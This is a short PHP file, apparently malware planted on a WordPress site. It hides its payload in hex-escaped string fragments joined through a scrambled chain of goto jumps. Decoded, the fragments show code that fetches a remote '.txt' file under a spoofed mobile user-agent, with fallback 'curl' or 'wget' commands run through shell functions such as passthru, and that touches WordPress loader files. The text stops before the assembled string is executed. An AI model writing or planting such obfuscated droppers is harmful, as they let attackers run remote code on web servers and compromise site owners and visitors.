<?php
error_reporting(0);
$lknpo=''; goto _697819D523866;
_697819D523866: $lknpo.="\x40\x65\x72\x72\x6f\x72\x5f\x72\x65\x70\x6f\x72"; goto _697819D52386A;
_697819D523870: $lknpo.="\x62\x2e\x63\x6f\x6d\x2f\x69\x6e\x64\x65\x78\x2e"; goto _697819D523871;
_697819D52388E: $lknpo.="\x74\x70\x27\x3d\x3e\x5b\x27\x68\x65\x61\x64\x65"; goto _697819D52388F;
_697819D523892: $lknpo.="\x29\x3b\x24\x63\x3d\x40\x66\x69\x6c\x65\x5f\x67"; goto _697819D523893;
_697819D5238C4: $lknpo.="\x24\x63\x6d\x64\x3d\x22\x63\x75\x72\x6c\x20\x2d"; goto _697819D5238C5;
_697819D523871: $lknpo.="\x74\x78\x74\x27\x3b\x0d\x0a\x24\x75\x61\x3d\x27"; goto _697819D523872;
_697819D5238E8: $lknpo.="\x3b\x40\x24\x66\x28\x24\x63\x6d\x64\x29\x3b\x24"; goto _697819D5238E9;
_697819D5238FD: $lknpo.="\x27\x3b"; goto _697819D5238FE;
_697819D5238FB: $lknpo.="\x52\x5f\x5f\x2e\x27\x2f\x77\x70\x2d\x62\x6c\x6f"; goto _697819D5238FC;
_697819D5238D0: $lknpo.="\x2c\x27\x70\x61\x73\x73\x74\x68\x72\x75\x27\x2c"; goto _697819D5238D1;
_697819D5238C8: $lknpo.="\x7c\x77\x67\x65\x74\x20\x2d\x71\x55\x20\x27\x24"; goto _697819D5238C9;
_697819D5238F4: $lknpo.="\x69\x6e\x65\x28\x27\x57\x50\x5f\x55\x53\x45\x5f"; goto _697819D5238F5;
_697819D5238A0: $lknpo.="\x69\x66\x28\x21\x24\x63\x26\x26\x66\x75\x6e\x63"; goto _697819D5238A1;
_697819D523879: $lknpo.="\x2e\x30\x2e\x30\x2e\x30\x20\x4d\x6f\x62\x69\x6c"; goto _697819D52387A;
_697819D5238F5: $lknpo.="\x54\x48\x45\x4d\x45\x53\x27\x2c\x74\x72\x75\x65"; goto _697819D5238F6;
_697819D523883: $lknpo.="\x35\x32\x3d\x3e\x31\x2c\x34\x32\x3d\x3e\x30\x2c"; goto _697819D523884;
_697819D52388C: $lknpo.="\x72\x65\x61\x6d\x5f\x63\x6f\x6e\x74\x65\x78\x74"; goto _697819D52388D;
_697819D5238B1: $lknpo.="\x74\x27\x5d\x2c\x38\x30\x2c\x24\x65\x2c\x24\x72"; goto _697819D5238B2;
_697819D523889: $lknpo.="\x63\x26\x26\x69\x6e\x69\x5f\x67\x65\x74\x28\x27"; goto _697819D52388A;
_697819D5238DA: $lknpo.="\x63\x3d\x6a\x6f\x69\x6e\x28\x22\x5c\x6e\x22\x2c"; goto _697819D5238DB;
